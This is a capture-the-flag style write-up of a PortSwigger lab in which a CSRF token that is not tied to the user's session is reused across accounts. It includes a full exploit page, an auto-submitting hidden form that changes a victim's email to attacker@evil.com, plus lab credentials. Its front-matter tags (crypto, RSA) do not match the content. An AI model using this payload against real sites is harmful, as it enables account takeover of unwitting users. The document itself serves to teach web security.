---
title: "csrf 4 - portswigger labs"
category: "crypto"
subcategory: "rsa"
type: "writeup"
tags: ["crypto", "wiener", "csrf", "rsa", "cryptography", "csrf-4"]
summary: "crypto writeup for \"csrf 4\" from portswigger labs - techniques: wiener, csrf, rsa, cryptography, csrf-4."
source:
  name: "siunam321.github.io"
  url: "https://siunam321.github.io/ctf/portswigger-labs/CSRF/csrf-4/"
original_source:
  name: "siunam321/siunam321.github.io"
  url: "https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/CSRF/csrf-4/README.md"
ctf:
  name: "portswigger labs"
  challenge: "csrf 4"
---

## Source

- **CTF:** portswigger labs
- **Challenge:** csrf 4
- **Author:** [siunam321](https://siunam321.github.io/)
- **Writeup:** <https://siunam321.github.io/ctf/portswigger-labs/CSRF/csrf-4/>
- **Source file:** <https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/CSRF/csrf-4/README.md>

---
# CSRF where token is not tied to user session | Dec 15, 2022

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session), you'll learn: CSRF where token is not tied to user session! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

-   `wiener:peter`
-   `carlos:montoya`

## Exploitation

**Home page:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-4/images/Pasted%20image%2020221215010423.png)

**Login as user `wiener`:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-4/images/Pasted%20image%2020221215010530.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-4/images/Pasted%20image%2020221215010537.png)

**In previous labs, we found that there is a email change functionality is vulnerable to CSRF, and it uses tokens to try to prevent CSRF attacks.**

**Let's inspect that form:**
```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="">
    <input required type="hidden" name="csrf" value="z9ku0XSiD7dC99MaTq7GgUQExcKRjCw1">
    <button class='button' type='submit'> Update email </button>
</form>
```

**Now, let's login as user `carlos` to see the CSRF token:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-4/images/Pasted%20image%2020221215010932.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-4/images/Pasted%20image%2020221215010946.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-4/images/Pasted%20image%2020221215010954.png)

**Inspect the form again:**
```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="">
    <input required type="hidden" name="csrf" value="02hQ8SHZTM6kWtull9XPktNIi3ixZI6b">
    <button class='button' type='submit'> Update email </button>
</form>
```

**Hmm... What if I use user `wiener` CSRF token in user `carlos`??**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-4/images/Pasted%20image%2020221215011218.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-4/images/Pasted%20image%2020221215011235.png)

It still works!

**Armed with above information, we can go to `exploit server`:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-4/images/Pasted%20image%2020221215011301.png)

**Then craft a form with user `carlos` CSRF token that performs CSRF attack:**
```html
<html>
	<head>
		<title>CSRF-4</title>
	</head>
	<body>
		<form action="https://0a75005103f31b2bc05213ae00f10011.web-security-academy.net/my-account/change-email" method="POST">
		    <input type="hidden" name="email" value="attacker@evil.com">
			<input required type="hidden" name="csrf" value="02hQ8SHZTM6kWtull9XPktNIi3ixZI6b">
		</form>

		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>
```

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-4/images/Pasted%20image%2020221215011712.png)

**Now, we can verify is it working or not in the `View exploit` button:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-4/images/Pasted%20image%2020221215011722.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-4/images/Pasted%20image%2020221215011732.png)

It works! 

**To change a user's email, we can grab a fresh CSRF token: `<input required type="hidden" name="csrf" value="7IfuZMECjozwHi0b4FO2UbczV8ACEX26">`**

**Then update the old CSRF token in our exploit:**
```html
<html>
	<head>
		<title>CSRF-4</title>
	</head>
	<body>
		<form action="https://0a75005103f31b2bc05213ae00f10011.web-security-academy.net/my-account/change-email" method="POST">
		    <input type="hidden" name="email" value="attacker@evil.com">
			<input required type="hidden" name="csrf" value="7IfuZMECjozwHi0b4FO2UbczV8ACEX26">
		</form>

		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>
```

**Finally, click `Deliver exploit to victim` button:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-4/images/Pasted%20image%2020221215011850.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-4/images/Pasted%20image%2020221215011916.png)

We've changed the victim's email address!

# What we've learned:

1. CSRF where token is not tied to user session
